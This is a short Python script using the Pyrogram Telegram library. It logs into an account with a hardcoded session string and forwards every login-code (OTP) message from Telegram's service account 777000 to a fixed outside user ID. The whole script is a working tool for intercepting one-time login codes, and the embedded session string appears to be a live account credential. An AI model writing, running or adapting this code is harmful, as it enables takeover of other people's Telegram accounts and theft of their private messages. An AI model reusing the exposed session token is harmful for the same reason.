from pyrogram import Client, filters
import os

SESSION_STRING = os.getenv("BQG9a8UAvpAuAqnt-pDQrcPUSxKLv7W5ejwdn0cRlDrJXGLSe3l8QIPEZ3UegMjlQjf1W4UDb_-8PVtr4PUX-GEyJauAvMf2v0G6-jRHBsgRuDQgos4XY8CdwzErATL0wSaqL_YKJW6O8rZnb0t6VBJBBKbmIO47ZaLPBUeWKTtNtrp45vatgqgbJvKmlps3pBw67DHwIhbcwLg_Z7wkGMIPXUUCz0LlXfQiW8JkmxSc_yQJbjXBE0AFTTzIZVyNOcgUWJTsmC4Xp5NlYMmHgTp4dTIZeKDyyIzISmMUMgNoC7l6i0jUaXA_9mgFRSTZkOL2e_Huvv2vrP8QKkGrjOoYFIHCegAAAAHJBgogAQ")
FORWARD_TO = 15829854  # Replace with target user ID or username

app = Client("forward_bot", session_string=SESSION_STRING)

@app.on_message(filters.incoming & filters.user(777000))
def forward_otp_message(client, message):
    try:
        message.forward(chat_id=FORWARD_TO)
        print("✅ Forwarded OTP message from 777000")
    except Exception as e:
        print(f"❌ Failed to forward message: {e}")

app.run()
